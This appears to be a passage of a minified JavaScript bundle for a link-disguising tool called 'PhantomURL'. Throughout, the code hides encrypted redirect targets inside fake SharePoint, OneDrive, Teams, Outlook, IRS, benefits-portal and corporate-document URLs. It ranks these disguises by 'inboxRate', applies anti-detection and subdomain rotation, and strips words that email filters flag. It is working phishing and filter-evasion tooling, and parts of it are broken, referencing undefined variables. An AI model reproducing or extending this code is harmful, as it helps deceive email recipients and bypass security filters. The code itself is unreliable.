encrypted:",S)}try{w=this.buildPatternUrl(s,N,l),console.log(" [CentralizedUrlProcessor] Pattern URL built successfully:",w)}catch(S){console.error(" [CentralizedUrlProcessor] Pattern URL building failed:",S),w=`/services/portal/access?session=${Math.random().toString(36).substring(2,6)}&data=${N}`,console.log(" [CentralizedUrlProcessor] Using intelligent fallback pattern:",w)}try{await this.registerUrlWithRetry(w,r,e),console.log(" [CentralizedUrlProcessor] URL registered in database")}catch(S){console.warn(" [CentralizedUrlProcessor] Database registration failed, but URL still works:",S)}await qs.trackUrlGeneration(!0,s,"advanced",{tier:(l==null?void 0:l.tier)||1,encryptionMode:_.mode}),y={pattern:s,tier:(l==null?void 0:l.tier)||1,contentType:this.getContentTypeForPattern(s),expectedSuccessRate:(l==null?void 0:l.success_rate)||this.getExpectedSuccessRate(s),encryptionMode:_.mode,patternName:(l==null?void 0:l.name)||this.getPatternName(s),generationMethod:"advanced"},console.log(" [CentralizedUrlProcessor] Advanced URL generated successfully")}catch(j){throw console.error(" [CentralizedUrlProcessor] Advanced generation failed:",j),j}}}catch(j){console.error(" [CentralizedUrlProcessor] Primary generation failed:",j),console.log(" [CentralizedUrlProcessor] Attempting intelligent fallback...");try{x=!0,console.log(" [CentralizedUrlProcessor] Generating intelligent fallback URL...");const N=Date.now().toString().substring(0,6),S=await Gn(e,r);w=`/services/portal/access?session=${N}&data=${S}`;try{await this.registerUrlWithRetry(w,r,e),console.log(" [CentralizedUrlProcessor] Intelligent fallback URL registered")}catch(k){console.warn(" [CentralizedUrlProcessor] Fallback registration failed, but URL still works:",k)}y={pattern:"intelligent-fallback",tier:1,contentType:"application/json",expectedSuccessRate:"92",encryptionMode:"xor",patternName:"Intelligent Fallback Pattern",generationMethod:"intelligent-fallback",originalError:j.message},console.log(" [CentralizedUrlProcessor] Intelligent fallback URL generated successfully")}catch(_){console.error(" [CentralizedUrlProcessor] Intelligent fallback also failed:",_),console.log(" [CentralizedUrlProcessor] Using emergency /e/ fallback...");try{const N=await Gn(e,r);w=`/documents/annual-report-${new Date().getFullYear()}.pdf?dept=finance&version=1.0&data=${N}`,y={pattern:"emergency-safe",tier:1,contentType:"application/pdf",expectedSuccessRate:"85",encryptionMode:"xor",patternName:"Emergency Safe Pattern",originalError:j.message,generationMethod:"emergency-safe"},console.log(" [CentralizedUrlProcessor] Emergency /e/ fallback generated")}catch(N){throw console.error(" [CentralizedUrlProcessor] All fallback methods failed:",N),new Error(`Complete URL generation failure. Primary: ${j.message}. Fallback: ${_.message}. Emergency: ${N.message}`)}}}if(h&&w)try{w=await this.applyAntiDetectionMeasures(w,f)}catch(j){console.warn("Anti-detection measures failed:",j)}if(g&&w)try{const j=await this.applySubdomainRotation(w);w=j.url,y.subdomain=j.subdomain,y.trustScore=j.trustScore}catch(j){console.warn("Subdomain rotation failed:",j)}if(!w)throw new Error("Generated URL is empty - this should never happen");if(!w.startsWith("/")&&!w.startsWith("http"))throw new Error(`Generated URL has invalid format: ${w}`);const b={url:w,metadata:{...y,generatedAt:new Date().toISOString(),usedFallback:x,targetUrlHash:this.simpleHash(e).substring(0,16)}};return console.log(" [CentralizedUrlProcessor] Final result:",b),b}async generateEncryptedPayload(e,r,n){try{return n==="auto"&&(n=Math.random()*10<7?"aes":"xor"),n==="aes"?(await Ur.encryptUrl(e,r,"auto","aes")).encrypted:await Gn(e,r)}catch{return await Gn(e,r)}}replacePlaceholders(e,r){let n=e;return Object.entries(r).forEach(([s,i])=>{const o=i!=null?String(i):this.generateFallbackValue(s);if(o==="undefined"||o==="null"||o===""){console.warn(`[replacePlaceholders]  CRITICAL: Invalid value for ${s}, generating fallback`);const l=this.generateFallbackValue(s);console.log(`[replacePlaceholders] Generated fallback for ${s}: ${l}`);const c=`{${s}}`;n=n.replace(new RegExp(`\\${c}`,"g"),l)}else{const l=`{${s}}`;n=n.replace(new RegExp(`\\${l}`,"g"),o)}}),n}generateFallbackValue(e){const r=e.toLowerCase(),n={session:"sess"+Math.random().toString(36).substring(2,8),doc:"doc"+Math.random().toString(36).substring(2,6),id:Math.random().toString(36).substring(2,8),ref:"ref"+Math.random().toString(36).substring(2,6),token:"tok"+Math.random().toString(36).substring(2,8),year:new Date().getFullYear().toString(),month:(new Date().getMonth()+1).toString().padStart(2,"0"),day:new Date().getDate().toString().padStart(2,"0"),version:"1.0",type:"standard",format:"pdf",lang:"en",region:"us"};return n[r]?n[r]:r.includes("id")||r.includes("num")?Math.random().toString(36).substring(2,8):r.includes("date")||r.includes("time")?new Date().toISOString().split("T")[0]:Math.random().toString(36).substring(2,6)}async applyAntiDetectionMeasures(e,r){try{const{antiDetection:n}=await Vt(async()=>{const{antiDetection:i}=await import("./antiDetection-m-Cg_b4m.js");return{antiDetection:i}},[]),s=n.analyzeDetectionRisk(e);return s.riskLevel==="high"||s.riskLevel==="critical"?n.applyAntiDetection(e,{aggressiveness:"moderate",targetProvider:r,enableTimeBasedEvasion:!0,enableBehavioralMimicry:!0,enablePatternRotation:!0}):e}catch(n){return console.warn("Anti-detection measures failed:",n),e}}async applySubdomainRotation(e){try{const{subdomainRotation:r}=await Vt(async()=>{const{subdomainRotation:n}=await import("./subdomainRotation-nhO2YB-3.js");return{subdomainRotation:n}},[]);return r.buildSubdomainUrl("example.com",e,{preferHighTrust:!0,balanceUsage:!0,avoidRecent:!0})}catch(r){return console.warn("Subdomain rotation failed:",r),{url:e,subdomain:"www",trustScore:50}}}async validateGeneratedUrl(e){const r=[],n=[];let s=0;(!e||e.length===0)&&(r.push("URL is empty"),s+=100),!e.startsWith("/")&&!e.startsWith("http")&&(r.push("URL must start with / or http"),s+=50);try{const{antiDetection:o}=await Vt(async()=>{const{antiDetection:c}=await import("./antiDetection-m-Cg_b4m.js");return{antiDetection:c}},[]),l=o.analyzeDetectionRisk(e);l.detectedPatterns.length>0&&(r.push(`Detected ${l.detectedPatterns.length} suspicious patterns`),s+=l.detectedPatterns.length*10,n.push(...l.recommendations))}catch(o){console.warn("Detection analysis failed:",o)}const i=e.match(/\{[^}]+\}/g);return i&&(r.push(`Unreplaced placeholders: ${i.join(", ")}`),s+=i.length*20,n.push("Ensure all placeholders are properly replaced with actual values")),e.length>2e3&&(r.push("URL is too long (>2000 characters)"),s+=30,n.push("Shorten URL to improve compatibility")),{isValid:r.length===0,issues:r,recommendations:n,riskScore:Math.min(100,s)}}async getPerformanceMetrics(){const e=this.optimizedProcessor.getMetrics();return{totalGenerated:e.totalProcessed,successRate:e.totalProcessed>0?e.successfulProcessed/e.totalProcessed*100:0,averageGenerationTime:e.averageProcessingTime,patternDistribution:Object.fromEntries(e.methodPerformance),antiDetectionEffectiveness:85}}applyPlanAObfuscation(e){return`${Math.floor(Date.now()/36e5).toString(36)}${e}`}applyPlanBObfuscation(e){const r=e.split("").reverse().join(""),n="0123456789ABCDEFGHJKMNPQRSTVWXYZ";let s="";for(let i=0;i<r.length;i+=3){const o=r.substring(i,i+3);let l=0;for(let c=0;c<o.length;c++)l=l*256+o.charCodeAt(c);for(let c=0;c<Math.ceil(o.length*8/5);c++)s=n[l%34]+s,l=Math.floor(l/34)}return s}buildPatternUrl(e,r,n){const s=Date.now().toString(),i=new Date().getFullYear();switch(e){case"search":return`/search?${`q=${r}&form=QBLH&sp=-1&lq=0&pq=${r.substring(0,8)}&sc=10-${r.length}&qs=n&sk=&cvid=${s.substring(0,8).toUpperCase()}`}`;case"document":return`/documents/annual-report-${i}.pdf?dept=finance&version=1.0&data=${r}`;case"business":return`/hr/policies/employee-handbook.pdf?section=benefits&lang=en&data=${r}`;case"content":return`/finance/reports/${i}/Q4-financial-report.pdf?dept=finance&version=2024.1&data=${r}`;case"intelligent":return`/sites/corporate/Shared%20Documents/reports/quarterly-review.pdf?web=1&download=1&at=${r}`;default:return`/tax/forms/${i}/form-1040.pdf?taxpayer=${s.substring(0,6)}&filing=single&data=${r}`}}getContentTypeForPattern(e){switch(e){case"search":return"text/html";case"document":return"application/pdf";case"business":return"application/json";case"content":return"text/html";case"intelligent":return"application/pdf";default:return"text/html"}}getExpectedSuccessRate(e){switch(e){case"search":return"94";case"document":return"96";case"business":return"93";case"content":return"91";case"intelligent":return"97";default:return"85"}}getPatternName(e){switch(e){case"search":return"Bing Search Pattern";case"document":return"Document Sharing Pattern";case"business":return"Business API Pattern";case"content":return"Content Management Pattern";case"intelligent":return"AI-Optimized Pattern";default:return"Standard Pattern"}}};re(Jn,"instance");let Ou=Jn;const $u=Ou.getInstance(),BC=Object.freeze(Object.defineProperty({__proto__:null,centralizedUrlProcessor:$u},Symbol.toStringTag,{value:"Module"})),F0=t=>{try{const e=new URL(t);return e.protocol==="http:"||e.protocol==="https:"}catch{return!1}},Xn=class Xn{static getInstance(){return Xn.instance||(Xn.instance=new Xn),Xn.instance}clearAllCaches(){try{if(typeof window<"u"&&window.localStorage){const e=[];for(let r=0;r<localStorage.length;r++){const n=localStorage.key(r);n&&(n.includes("pattern")||n.includes("url_")||n.includes("phantom")||n.includes("cache"))&&e.push(n)}e.forEach(r=>localStorage.removeItem(r)),console.log(`[CacheManager] Cleared ${e.length} localStorage entries`)}if(typeof window<"u"&&window.sessionStorage&&(sessionStorage.clear(),console.log("[CacheManager] Cleared sessionStorage")),typeof window<"u"){const e=Date.now();window.history.replaceState(null,"",`${window.location.pathname}?_cacheBust=${e}`)}console.log("[CacheManager]  All caches cleared successfully")}catch(e){console.error("[CacheManager] Error clearing caches:",e)}}clearPatternCaches(){try{if(typeof window<"u"&&window.localStorage){const e=[];for(let r=0;r<localStorage.length;r++){const n=localStorage.key(r);n&&n.includes("pattern")&&e.push(n)}e.forEach(r=>localStorage.removeItem(r)),console.log(`[CacheManager] Cleared ${e.length} pattern cache entries`)}}catch(e){console.error("[CacheManager] Error clearing pattern caches:",e)}}getCacheStats(){try{let e=0,r=0;return typeof window<"u"&&(e=window.localStorage?window.localStorage.length:0,r=window.sessionStorage?window.sessionStorage.length:0),{localStorageEntries:e,sessionStorageEntries:r}}catch(e){return console.error("[CacheManager] Error getting cache stats:",e),{localStorageEntries:0,sessionStorageEntries:0}}}};re(Xn,"instance");let Uu=Xn;const B3=Uu.getInstance(),V3=[{id:"ms_sharepoint_001",name:"SharePoint Document Library",template:"/sites/{department}/Shared%20Documents/{folder}/{filename}.pdf?web=1&download=1&at={access_token}",category:"microsoft",trustScore:98,safeExtensions:[".pdf",".docx",".xlsx"],businessContext:"SharePoint document sharing",placeholders:["department","folder","filename","access_token"],tier:1,inboxRate:97},{id:"ms_onedrive_001",name:"OneDrive Business Share",template:"/personal/{user}_{domain}/Documents/{folder}/{filename}.pdf?d=w{share_id}&csf=1&web=1",category:"microsoft",trustScore:97,safeExtensions:[".pdf",".docx",".xlsx"],businessContext:"OneDrive business file sharing",placeholders:["user","domain","folder","filename","share_id"],tier:1,inboxRate:96},{id:"ms_teams_001",name:"Microsoft Teams File",template:"/teams/{team_id}/channels/{channel}/files/{folder}/{filename}.pdf?version={version}&web=1",category:"microsoft",trustScore:96,safeExtensions:[".pdf",".docx",".xlsx"],businessContext:"Teams channel file sharing",placeholders:["team_id","channel","folder","filename","version"],tier:1,inboxRate:95},{id:"ms_outlook_001",name:"Outlook Attachment Link",template:"/owa/attachment.ashx?attach={attachment_id}&id={message_id}&X-OWA-CANARY={canary}",category:"microsoft",trustScore:95,safeExtensions:[".pdf",".docx"],businessContext:"Outlook web attachment",placeholders:["attachment_id","message_id","canary"],tier:1,inboxRate:94}],H3=[{id:"corp_finance_001",name:"Financial Report Portal",template:"/finance/reports/{year}/Q{quarter}-financial-report.pdf?dept={department}&version={version}",category:"corporate",trustScore:94,safeExtensions:[".pdf"],businessContext:"Corporate financial reporting",placeholders:["year","quarter","department","version"],tier:1,inboxRate:93},{id:"corp_hr_001",name:"HR Policy Document",template:"/hr/policies/{policy_type}/{year}/employee-handbook.pdf?section={section}&lang={language}",category:"corporate",trustScore:93,safeExtensions:[".pdf",".docx"],businessContext:"HR policy documentation",placeholders:["policy_type","year","section","language"],tier:1,inboxRate:92},{id:"corp_legal_001",name:"Legal Document Portal",template:"/legal/contracts/{contract_type}/{year}/agreement-{contract_id}.pdf?party={party}&status={status}",category:"corporate",trustScore:92,safeExtensions:[".pdf"],businessContext:"Legal contract management",placeholders:["contract_type","year","contract_id","party","status"],tier:1,inboxRate:91},{id:"corp_compliance_001",name:"Compliance Training",template:"/compliance/training/{module}/{year}/certification.pdf?employee={employee_id}&completion={date}",category:"corporate",trustScore:91,safeExtensions:[".pdf",".docx"],businessContext:"Compliance training materials",placeholders:["module","year","employee_id","date"],tier:1,inboxRate:90}],G3=[{id:"gov_tax_001",name:"Tax Document Portal",template:"/tax/forms/{year}/form-{form_number}.pdf?taxpayer={taxpayer_id}&filing={filing_status}",category:"government",trustScore:99,safeExtensions:[".pdf"],businessContext:"Government tax documentation",placeholders:["year","form_number","taxpayer_id","filing_status"],tier:1,inboxRate:98},{id:"gov_benefits_001",name:"Benefits Verification",template:"/benefits/verification/{state}/case-{case_number}.pdf?beneficiary={beneficiary_id}&period={period}",category:"government",trustScore:98,safeExtensions:[".pdf"],businessContext:"Government benefits verification",placeholders:["state","case_number","beneficiary_id","period"],tier:1,inboxRate:97},{id:"gov_permits_001",name:"Permit Application",template:"/permits/{agency}/applications/{permit_type}-{application_id}.pdf?applicant={applicant_id}&status={status}",category:"government",trustScore:97,safeExtensions:[".pdf"],businessContext:"Government permit applications",placeholders:["agency","permit_type","application_id","applicant_id","status"],tier:1,inboxRate:96}],W3=[{id:"edu_transcript_001",name:"Academic Transcript",template:"/registrar/transcripts/{student_id}/{year}/official-transcript.pdf?semester={semester}&gpa={gpa}",category:"education",trustScore:96,safeExtensions:[".pdf"],businessContext:"Academic transcript access",placeholders:["student_id","year","semester","gpa"],tier:1,inboxRate:95},{id:"edu_course_001",name:"Course Materials",template:"/courses/{course_code}/{semester}/materials/{module}.pdf?instructor={instructor}&section={section}",category:"education",trustScore:95,safeExtensions:[".pdf",".docx"],businessContext:"Educational course materials",placeholders:["course_code","semester","module","instructor","section"],tier:1,inboxRate:94}],K3=[{id:"biz_invoice_001",name:"Invoice Portal",template:"/billing/invoices/{year}/{month}/invoice-{invoice_number}.pdf?customer={customer_id}&amount={amount}",category:"business",trustScore:89,safeExtensions:[".pdf"],businessContext:"Business invoice management",placeholders:["year","month","invoice_number","customer_id","amount"],tier:2,inboxRate:88},{id:"biz_proposal_001",name:"Business Proposal",template:"/proposals/{client}/{year}/proposal-{proposal_id}.pdf?project={project_name}&value={value}",category:"business",trustScore:88,safeExtensions:[".pdf",".docx"],businessContext:"Business proposal documents",placeholders:["client","year","proposal_id","project_name","value"],tier:2,inboxRate:87}],xr=[...V3,...H3,...G3,...W3,...K3],q3=t=>xr.filter(e=>e.category===t),Zn=class Zn{constructor(){re(this,"departments",["finance","hr","legal","marketing","operations","it","sales","compliance","procurement","facilities","security","audit"]);re(this,"companies",["acme-corp","global-solutions","tech-innovations","business-systems","enterprise-group","professional-services","consulting-partners","strategic-advisors","corporate-solutions","industry-leaders"]);re(this,"documentTypes",["annual-report","quarterly-review","policy-update","training-manual","compliance-guide","employee-handbook","financial-statement","project-proposal","contract-agreement","certification"]);re(this,"fileFormats",["pdf","docx","xlsx"]);re(this,"governmentAgencies",["IRS","SSA","DHS","DOE","EPA","FDA","OSHA","DOL","HUD","VA"]);re(this,"states",["CA","NY","TX","FL","IL","PA","OH","GA","NC","MI","NJ","VA","WA","AZ","MA","TN","IN","MO","MD","WI"]);re(this,"courseCodes",["BUS101","FIN201","MKT301","MGT401","ACC101","ECO201","CS101","ENG101","MAT201","SCI101","HIS201","PSY101"])}static getInstance(){return Zn.instance||(Zn.instance=new Zn),Zn.instance}generateParameter(e,r){const n=e.toLowerCase();return n.includes("year")?this.generateYear(r):n.includes("quarter")?this.generateQuarter():n.includes("month")?this.generateMonth():n.includes("date")||n.includes("day")?this.generateDate():n.includes("semester")?this.generateSemester():n.includes("department")||n.includes("dept")?this.randomChoice(this.departments):n.includes("company")||n.includes("organization")?this.randomChoice(this.companies):n.includes("filename")||n.includes("document")?this.generateDocumentName(r):n.includes("folder")?this.generateFolderName(r):n.includes("agency")?this.randomChoice(this.governmentAgencies):n.includes("state")?this.randomChoice(this.states):n.includes("form_number")||n.includes("form_id")?this.generateFormNumber():n.includes("course")?this.randomChoice(this.courseCodes):n.includes("student")?this.generateStudentId():n.includes("instructor")?this.generateInstructorName():n.includes("id")&&!n.includes("student")?this.generateBusinessId(n):n.includes("number")||n.includes("num")?this.generateBusinessNumber(n):n.includes("version")?this.generateVersion():n.includes("status")?this.generateStatus(r):n.includes("level")?this.generateLevel():n.includes("token")||n.includes("access")?this.generateAccessToken():n.includes("canary")?this.generateCanaryToken():n.includes("share")?this.generateShareId():n.includes("lang")||n.includes("language")?"en":n.includes("region")?"us":this.generateFallbackValue(e)}generateYear(e){const r=new Date().getFullYear();return Math.random()<.8?r.toString():(r-1).toString()}generateQuarter(){return`Q${Math.ceil(Math.random()*4)}`}generateMonth(){return(Math.floor(Math.random()*12)+1).toString().padStart(2,"0")}generateDate(){return new Date().toISOString().split("T")[0]}generateSemester(){const e=["spring","summer","fall","winter"],r=new Date().getFullYear();return`${this.randomChoice(e)}-${r}`}generateDocumentName(e){const r=this.randomChoice(this.documentTypes),n=new Date().getFullYear();return`${r}-${n}`}generateFolderName(e){return e.category==="government"?this.randomChoice(["forms","applications","notices","documents"]):e.category==="education"?this.randomChoice(["materials","assignments","resources","handouts"]):this.randomChoice(["documents","reports","files","resources"])}generateFormNumber(){const e=["1040","941","W-2","W-4","1099","SS-4","I-9"];return this.randomChoice(e)}generateStudentId(){return"STU"+Math.floor(Math.random()*9e5+1e5).toString()}generateInstructorName(){const e=["smith","johnson","williams","brown","jones","garcia","miller","davis"];return this.randomChoice(e)}generateBusinessId(e){return e.includes("employee")?"EMP"+Math.floor(Math.random()*9e4+1e4).toString():e.includes("customer")?"CUST"+Math.floor(Math.random()*9e5+1e5).toString():e.includes("invoice")?"INV"+Math.floor(Math.random()*9e4+1e4).toString():e.includes("contract")?"CTR"+Math.floor(Math.random()*9e4+1e4).toString():"BIZ"+Math.random().toString(36).substring(2,8).toUpperCase()}generateBusinessNumber(e){return e.includes("invoice")?Math.floor(Math.random()*9e5+1e5).toString():e.includes("order")?"ORD"+Math.floor(Math.random()*9e4+1e4).toString():e.includes("case")?Math.floor(Math.random()*9e6+1e6).toString():Math.floor(Math.random()*9e4+1e4).toString()}generateVersion(){const e=Math.floor(Math.random()*5)+1,r=Math.floor(Math.random()*10);return`${e}.${r}`}generateStatus(e){return e.category==="government"?this.randomChoice(["pending","approved","processing","completed"]):e.category==="business"?this.randomChoice(["active","pending","approved","final"]):this.randomChoice(["active","pending","completed"])}generateLevel(){return this.randomChoice(["basic","standard","premium","enterprise"])}generateAccessToken(){return"AT"+Math.random().toString(36).substring(2,12).toUpperCase()}generateCanaryToken(){return Math.random().toString(36).substring(2,16).toUpperCase()}generateShareId(){return"w"+Math.random().toString(36).substring(2,12).toUpperCase()}generateFallbackValue(e){return e.length<=3?Math.random().toString(36).substring(2,5):"VAL"+Math.random().toString(36).substring(2,6).toUpperCase()}randomChoice(e){return e[Math.floor(Math.random()*e.length)]}generateAllParameters(e,r){const n={};return(e.match(/\{([^}]+)\}/g)||[]).forEach(i=>{const o=i.slice(1,-1);o!=="encrypted"&&(n[o]=this.generateParameter(o,r))}),n}};re(Zn,"instance");let Du=Zn;const es=class es{constructor(){re(this,"parameterGenerator");re(this,"usedPatterns",new Set);re(this,"rotationCounter",0);this.parameterGenerator=Du.getInstance()}static getInstance(){return es.instance||(es.instance=new es),es.instance}selectOptimalPattern(e={}){let r=[...xr];if(e.targetProvider&&(r=this.filterByProvider(r,e.targetProvider)),e.campaignType&&(r=r.filter(s=>s.category===e.campaignType)),e.minTrustScore&&(r=r.filter(s=>s.trustScore>=e.minTrustScore)),e.minInboxRate&&(r=r.filter(s=>s.inboxRate>=e.minInboxRate)),e.preferredTier&&(r=r.filter(s=>s.tier===e.preferredTier)),e.avoidSuspiciousPatterns&&(r=this.filterOutSuspiciousPatterns(r)),r.length===0)return console.warn("[InboxSafePatternManager] No patterns match criteria, using fallback"),this.getFallbackPattern();r.sort((s,i)=>{const o=s.trustScore*.6+s.inboxRate*.4;return i.trustScore*.6+i.inboxRate*.4-o});const n=this.selectWithRotation(r);return console.log(`[InboxSafePatternManager] Selected pattern: ${n.name} (Trust: ${n.trustScore}, Inbox: ${n.inboxRate}%)`),n}generateCompleteUrl(e,r,n={}){const s=this.parameterGenerator.generateAllParameters(e.template,{category:e.category,...n});s.encrypted=r;let i=e.template;Object.entries(s).forEach(([l,c])=>{const d=`{${l}}`;i=i.replace(new RegExp(`\\${d}`,"g"),c)});const o=i.match(/\{[^}]+\}/g);return o&&(console.warn(`[InboxSafePatternManager] Unreplaced placeholders found: ${o.join(", ")}`),o.forEach(l=>{const c=l.slice(1,-1),d=this.generateSafeFallback(c);i=i.replace(l,d)})),{template:e.template,parameters:s,pattern:e,finalUrl:i,trustScore:e.trustScore,expectedInboxRate:e.inboxRate}}filterByProvider(e,r){switch(r){case"microsoft":return e.filter(n=>n.category==="microsoft"||n.businessContext.toLowerCase().includes("sharepoint")||n.businessContext.toLowerCase().includes("onedrive")||n.businessContext.toLowerCase().includes("teams"));case"google":return e.filter(n=>n.category==="corporate"||n.category==="business"||n.category==="education");case"corporate":return e.filter(n=>n.category==="corporate"||n.category==="government");default:return e}}filterOutSuspiciousPatterns(e){return e.filter(r=>{const n=r.template.toLowerCase();return!["track","click","redirect","proxy","gateway","api","endpoint","service","portal"].some(i=>n.includes(i))})}selectWithRotation(e){const r=e.filter(i=>!this.usedPatterns.has(i.id));if(r.length===0)return this.usedPatterns.clear(),this.rotationCounter=0,e[0];const n=this.rotationCounter%r.length,s=r[n];return this.usedPatterns.add(s.id),this.rotationCounter++,this.usedPatterns.size>e.length*.7&&this.usedPatterns.clear(),s}getFallbackPattern(){return q3("government")[0]||xr[0]}generateSafeFallback(e){const r=e.toLowerCase();return r.includes("id")?"ID"+Math.random().toString(36).substring(2,8).toUpperCase():r.includes("year")?new Date().getFullYear().toString():r.includes("month")?(new Date().getMonth()+1).toString().padStart(2,"0"):r.includes("version")?"1.0":"VAL"+Math.random().toString(36).substring(2,4).toUpperCase()}getPatternStats(){const e={totalPatterns:xr.length,averageTrustScore:0,averageInboxRate:0,patternsByCategory:{},patternsByTier:{}};return e.averageTrustScore=xr.reduce((r,n)=>r+n.trustScore,0)/xr.length,e.averageInboxRate=xr.reduce((r,n)=>r+n.inboxRate,0)/xr.length,xr.forEach(r=>{e.patternsByCategory[r.category]=(e.patternsByCategory[r.category]||0)+1,e.patternsByTier[r.tier]=(e.patternsByTier[r.tier]||0)+1}),e}testPatternGeneration(e){const r=e?xr.find(s=>s.id===e):this.selectOptimalPattern({minTrustScore:95});if(!r)return null;const n="TEST"+Math.random().toString(36).substring(2,20).toUpperCase();return this.generateCompleteUrl(r,n,{category:r.category,industry:"technology",targetProvider:"microsoft"})}};re(es,"instance");let zu=es;class Q3{constructor(){re(this,"logs",[])}async logUrlGeneration(e,r,n,s,i={}){const o={id:Math.random().toString(36).substring(2,15),timestamp:new Date,eventType:"URL_GENERATION",severity:"LOW",licenseKeyId:e,details:{originalUrl:r.substring(0,100),encryptionMode:n,patternName:s,...i}};this.logs.push(o)}async logEvent(e){const r={id:Math.random().toString(36).substring(2,15),timestamp:new Date,...e};this.logs.push(r)}async getLogs(e,r,n=100){let s=this.logs;return e&&(s=s.filter(i=>i.licenseKeyId===e)),r&&(s=s.filter(i=>i.eventType===r)),s.sort((i,o)=>o.timestamp.getTime()-i.timestamp.getTime()).slice(0,n)}async getLogsByTimeRange(e,r,n){let s=this.logs.filter(i=>i.timestamp>=e&&i.timestamp<=r);return n&&(s=s.filter(i=>i.licenseKeyId===n)),s.sort((i,o)=>o.timestamp.getTime()-i.timestamp.getTime())}async clearOldLogs(e=30){const r=new Date;r.setDate(r.getDate()-e);const n=this.logs.length;this.logs=this.logs.filter(i=>i.timestamp>r);const s=n-this.logs.length;return console.log(`AuditLoggingService: Cleared ${s} old logs`),s}}const B0=new Q3;let dd=class{async generatePhantomUrl(e,r,n={}){B3.clearPatternCaches();const s=await Rv.checkRateLimit(r,"url_generation",navigator.userAgent,"client-request");if(!s.allowed)throw new Error(`Rate limit exceeded: ${s.reason}. Try again in ${Math.ceil((s.resetTime.getTime()-Date.now())/6e4)} minutes.`);const{pattern:i="intelligent",stealthLevel:o="both",encryptionMode:l="aes",tier:c=1,context:d={}}=n,u=this.convertLegacyPatternToContext(i,d,c);return this.generateIntelligentUrl(e,r,u,{stealthLevel:o,encryptionMode:l})}convertLegacyPatternToContext(e,r,n){const s={...r,tier:n};switch(e){case"document":return{...s,category:"government",targetAudience:"business"};case"business":return{...s,category:"business",targetAudience:"professional"};case"content":return{...s,category:"news",targetAudience:"general"};case"legacy":return{...s,category:"technology",tier:4};case"search":return{...s,category:"search",targetAudience:"general"};default:return s.category?s:{...s,category:"business"}}}async generateIntelligentUrl(e,r,n,s){try{const i=zu.getInstance(),o={targetProvider:n.targetProvider,campaignType:this.mapCategoryToCampaignType(n.category),minTrustScore:90,minInboxRate:85,preferredTier:1,avoidSuspiciousPatterns:!0},l=i.selectOptimalPattern(o);if(!l)return console.warn("[PhantomURL] No inbox-safe pattern found, falling back to legacy"),this.generateLegacyFallback(e,r,s);console.log(`[PhantomURL] Selected inbox-safe pattern: ${l.name} (Trust: ${l.trustScore})`);const c=l.template,d=await Ur.encryptUrl(e,r,c,s.encryptionMode);let u=d.encrypted;(s.stealthLevel==="planA"||s.stealthLevel==="both")&&(u=this.applyPlanAObfuscation(u)),(s.stealthLevel==="planB"||s.stealthLevel==="both")&&(u=this.applyPlanBObfuscation(u));const h=i.generateCompleteUrl(l,u,{category:l.category,industry:n.industry,targetProvider:n.targetProvider,campaignType:this.mapCategoryToCampaignType(n.category)});console.log(`[PhantomURL] Generated inbox-safe URL with ${Object.keys(h.parameters).length} parameters`);let f=h.finalUrl;console.log(`[PhantomURL] Generated relative URL: ${f}`);const m=new Date;m.setHours(m.getHours()+expiryHours);const g=d.mode==="aes"?8:3,v=s.stealthLevel==="both"?2:s.stealthLevel==="planA"?1:0,w=pattern.tier===1?1:0,y=Math.min(10,g+v+w);let x=!1;const b=3;let j="";for(let _=0;_<b;_++)try{const N=$u.generateUrlHash(f,r);j=N,console.log(` [PhantomURL] Attempt ${_+1}: Registering URL with hash: ${N}`),console.log(` [PhantomURL] URL: ${f}`),console.log(` [PhantomURL] Original: ${e}`);const{data:S,error:k}=await $.rpc("register_generated_url",{url_hash_input:N,license_key_id_input:r,pattern_name_input:pattern.name,redirect_url_input:e,expiry_hours:24});if(!k&&S&&S.success){x=!0,console.log(` [PhantomURL] Successfully registered URL with hash: ${N}`),await B0.logUrlGeneration(r,e,d.mode,pattern.name,{tier:pattern.tier,securityLevel:y,expectedSuccessRate:pattern.successRate,urlHash:N});break}else console.warn(" [PhantomURL] Registration failed:",k);_<b-1&&await new Promise(C=>setTimeout(C,100*(_+1)))}catch(N){console.warn(`URL registration attempt ${_+1} failed:`,N),_===b-1&&(console.warn("All registration attempts failed, proceeding without registry"),await B0.logEvent({eventType:"DATABASE_ERROR",severity:"HIGH",licenseKeyId:r,details:{operation:"url_registration",error:String(N),originalUrl:e.substring(0,100),attempts:b,finalHash:j}}))}if(x)try{const _=$u.generateUrlHash(f,r);await $.from("url_registry").update({pattern_id:pattern.id,pattern_metadata:{pattern_name:pattern.name,category:pattern.category,tier:pattern.tier},usage_context:{...n,reasoning:patternSelection.reasoning,expiry_hours:expiryHours}}).eq("url_hash",_)}catch(_){console.warn("Failed to update pattern metadata:",_)}return{url:f,pattern:l.name,tier:l.tier,expectedSuccessRate:l.inboxRate,contentType:"application/pdf",encryptionMode:d.mode,securityLevel:y}}catch(i){if(console.error(" CRITICAL: Intelligent pattern generation failed:",i),console.error(" Error details:",i instanceof Error?i.message:String(i)),console.error(" Error stack:",i instanceof Error?i.stack:"No stack trace"),n.category==="search")throw console.error(" BING PATTERN MUST WORK - NO FALLBACKS ALLOWED"),new Error(`Bing pattern generation failed: ${i instanceof Error?i.message:String(i)}`);return console.warn(" Falling back to emergency pattern generation for non-search category"),this.generateEmergencyFallbackPattern(e,r,s)}}applyPlanAObfuscation(e){return`${Math.floor(Date.now()/36e5).toString(36)}${e}`}mapCategoryToCampaignType(e){if(!e)return;const r=e.toLowerCase();return r.includes("gov")||r.includes("tax")||r.includes("permit")?"government":r.includes("edu")||r.includes("school")||r.includes("university")?"education":"business"}async generateLegacyFallback(e,r,n){console.warn("[PhantomURL] Using legacy fallback pattern");const i=await Ur.encryptUrl(e,r,"/documents/report-{year}.pdf?dept={department}&version={version}",n.encryptionMode);return{url:`/documents/report-${new Date().getFullYear().toString()}.pdf?dept=finance&version=1.0&data=${i.encrypted}`,pattern:"legacy-fallback",tier:1,expectedSuccessRate:85,contentType:"application/pdf",encryptionMode:i.mode,securityLevel:5}}applyPlanBObfuscation(e){const r=e.split("").reverse().join(""),{encodeBase34:n}=require("./encryption/base34Encoder");return n(r)}generateDynamicParameters(e,r){const n={},s=new Date,i=e.template||"",o=i.match(/\{([^}]+)\}/g)||[];return console.log(`[generateDynamicParameters] Found ${o.length} placeholders in template: ${i}`),o.forEach(l=>{const c=l.slice(1,-1);if(c==="encrypted")return;const d=this.generateParameterValue(c,r,s);n[c]=d,console.log(`[generateDynamicParameters] Generated ${c} = ${d}`)}),n}generateParameterValue(e,r,n){const s=e.toLowerCase();return 